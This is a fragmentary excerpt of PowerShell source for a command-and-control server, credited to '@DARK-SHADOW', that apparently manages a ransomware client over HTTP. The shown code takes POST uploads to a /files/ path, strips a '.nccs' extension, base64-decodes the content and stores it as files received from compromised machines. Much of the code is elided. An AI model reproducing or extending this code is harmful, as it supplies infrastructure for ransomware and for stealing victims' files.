...
$Host.UI.RawUI.WindowTitle = "C2Server - by @DARK-SHADOW" 
...
function Show-Help {
   ...
   Write-Host "        nccsansom client through HTTP protocol"
...
if ($context.Request.HttpMethod -eq "POST") {
   ...
   if ($context.Request.RawUrl -like "/files/*") { 
      ...
      if ($OSVersion -like "*Win*") { $C2Rfile = "$pwd\C2Files\$B64Name" } else { $C2Rfile = "$pwd/C2Files/$B64Name" } 
         $C2RName = $C2Rfile.replace(".nccs","") ; Write-Host "[+] $C2RName file recieved" -f Blue ; $B64file = R64Decoder -f $FormContent
